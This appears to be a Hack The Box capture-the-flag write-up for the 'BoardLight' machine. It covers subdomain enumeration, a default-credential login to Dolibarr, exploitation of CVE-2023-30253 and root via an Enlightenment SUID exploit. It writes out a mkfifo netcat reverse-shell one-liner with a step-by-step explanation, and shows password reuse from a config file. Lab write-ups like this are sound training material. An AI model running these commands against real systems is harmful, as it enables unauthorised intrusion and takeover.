# BoardLight-----HTB

First of all the nmap report:

We have port 80 and 22 open. 80 is the following website:
<img width="1919" height="836" alt="image" src="https://github.com/user-attachments/assets/fadedcc9-a1e5-43f8-960e-2dc3e428c1bf" />

Let's try ffufing some subdomains:
<img width="992" height="609" alt="image" src="https://github.com/user-attachments/assets/ba712d67-bf5e-4b92-a130-cab08ab288c0" />

We find the crm domain. After we append it to /etc/hosts, we can see that it's the login page for Dolibarr the CRM used by this website:
<img width="1915" height="833" alt="image" src="https://github.com/user-attachments/assets/772e4801-f2c5-4ac4-8385-8f0d05226f6d" />

Let's try to login with admin / admin:
<img width="1919" height="737" alt="image" src="https://github.com/user-attachments/assets/554293b3-10b8-4836-bb20-c8ca0278d0b0" />

Good, they kept default credentials. Now, let's try looking fot CVE's for version 17.0.0 of Dolibarr. We can find this one:
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

Git clone it to you linux, make a venv and install the requirements in it so we can get working with it.

Okn this is the README teaching us how to use it:
## USAGE
```
usage: CVE-2023-30253.py [-h] [--url URL] [-u USER] [-p PASSWORD] (-c COMMAND | -r ip port)

Argument parser

options:
  -h, --help            show this help message and exit
  --url URL             URL of the website
  -u USER, --user USER  Username
  -p PASSWORD, --password PASSWORD
                        Password
  -c COMMAND, --command COMMAND
                        Command to execute
  -r ip port, --reverseshell ip port
                        Reverse shell IP and port

They actually have an automatic rev shell in it, but let's try to make our own.
First, open a net cat listener on a port of your desire:
nc -lvvp 4444

The base command for the CVE is going to be like this:
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -c "<command>"

Intead of command we are going to write the following:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your ip> <your open nc port> > /tmp/f
This is a basic mmkfifo netcat reverse shell. Breaking it down what it does is remove any files named "f" in tmp, then creates a fifo file named "f" inside /tmp. Next we cat the contents of "f" and pipe them to an interactive shell and right away pipe the outputs and errors that come out from this interactive shell to a nc shell to <your open nc port> at <your ip> and finally, to close the cicle we redirec the output od the this net cat shell to /tmp/f, giving us a complete reverse shell.
Let's try it:
<img width="1519" height="685" alt="image" src="https://github.com/user-attachments/assets/0d4ad785-86d4-462a-97cf-78b3c1fc5624" />

It seems to have worked, let's see the listener:
<img width="671" height="261" alt="image" src="https://github.com/user-attachments/assets/f917152e-4b50-4951-8ad1-02023216c599" />

We have a web shell. Let's look around it for a while see if we can find anything usefull. First we navigate to /var/www/html/crm.board.htb/htdocs/conf and cat conf.php and inside it we find:
<img width="1011" height="473" alt="image" src="https://github.com/user-attachments/assets/54256f09-2658-49df-9d94-1c3a37ef4265" />

We could try dumping this database, but instead, let's check the users in this system at /etc/hosts:
<img width="900" height="203" alt="image" src="https://github.com/user-attachments/assets/f437abd0-dfbb-4da6-b870-9e9eb61b0acc" />

We can see that the UID 1000 is called larissa. Let's try ssh connection with this username and the password we found:
<img width="881" height="302" alt="image" src="https://github.com/user-attachments/assets/dc4bc3cc-4307-4645-8bf8-7351837a4a40" />
bingo! Just cat user.txt

PRIVESC
sudo -l is not available in this system so let's try searching for binaries that are set to run as root, for example: sudo! (You can read more about it here: https://rootrecipe.medium.com/suid-binaries-27c724ef753c). The following command shall work just fine for now:
find / -user root -perm -4000 -print 2>/dev/null
<img width="875" height="446" alt="image" src="https://github.com/user-attachments/assets/7140481d-342b-445e-9910-af3dab6e8676" />

In here what should call to our attention is "enlightenment" a desktop manager. Let's check the version being used:
<img width="955" height="255" alt="image" src="https://github.com/user-attachments/assets/f856432b-f924-49f5-855e-99f55af36f11" />

If we search for CVE's for it we find the wonderfull lesson in pwning https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
git clone it to your linux, open a python server at the folder where exploit.sh is located.
<img width="800" height="102" alt="image" src="https://github.com/user-attachments/assets/8fa4d338-85e2-4fc4-ab7e-35a1fcf172b4" />

At larissa's computer, navigate to /tmp and wget exploit.sh, like so:
<img width="1911" height="319" alt="image" src="https://github.com/user-attachments/assets/102adaf3-6475-42b4-9eca-0760a3086033" />

chmod it, so it becomes executable:
<img width="1421" height="385" alt="image" src="https://github.com/user-attachments/assets/b179b598-97e0-439c-9efe-c9236be2b956" />

Execute it and get root
<img width="1421" height="385" alt="image" src="https://github.com/user-attachments/assets/67d3ce37-77a7-41f2-9ab8-78cae88a5249" />

















